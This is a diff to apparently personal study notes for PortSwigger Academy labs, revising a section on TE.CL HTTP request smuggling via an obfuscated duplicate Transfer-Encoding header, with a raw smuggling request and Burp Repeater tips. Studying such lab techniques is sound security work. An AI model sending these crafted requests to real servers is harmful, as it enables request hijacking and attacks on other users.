@@ -487,19 +487,21 @@ x=1
 
 [PortSwigger Lab: Exploiting HTTP request smuggling to deliver reflected XSS](https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss)  
 
-### Dualchunk TE  
+### TE.CL dualchunk - Transfer-encoding obfuscated  
 
 >If Duplicate header names are allowed, and the vulnerability is detected as **dualchunk**, then add an additional header with name and value = **Transfer-encoding: cow**.  Use [obfuscating](#obfuscation) techniques with second TE.  
 
-<sub>Some servers that do support the Transfer-Encoding header can be induced not to process it if the header is [obfuscated](#obfuscation) in some way. Ways to obfuscate the Transfer-Encoding header. For example:</sub>  
+>Some servers that do support the Transfer-Encoding header can be induced not to process it if the header is [obfuscated](#obfuscation) in some way. Ways to obfuscate the Transfer-Encoding header.  
+
+>On Repeater menu ensure that the **"Update Content-Length"** option is unchecked.  
 
 ```html
 POST / HTTP/1.1
-Host: TARGET.web-security-academy.net
+Host: TARGET.websecurity-academy.net
 Content-Type: application/x-www-form-urlencoded
-Content-length: 245
+Content-length: 4
 Transfer-Encoding: chunked
-Transfer-encoding: cow
+Transfer-encoding: identity
 
 5c
 GET /post?postId=4 HTTP/1.1
@@ -508,14 +510,19 @@ Content-Type: application/x-www-form-urlencoded
 Content-Length: 15
 
 x=1
-0  
+0\r\n  
+\r\n
   
 ```  
 
->**Note:** You need to include the trailing sequence \r\n\r\n following the final **0**.  
+![gpost.png](gpost.png)  
+
+>**Note:** You need to include the trailing sequence **\r\n\r\n** following the final **0**.  
 
 [PortSwigger Lab: HTTP request smuggling, obfuscating the Transfer-Encoding (TE) header](https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header)  
-
+  
+>I fail to see how this in exam/prod can be played to be dangerous or lead to exploitation!?  
+  
 
 # Privilege Escalation  
   
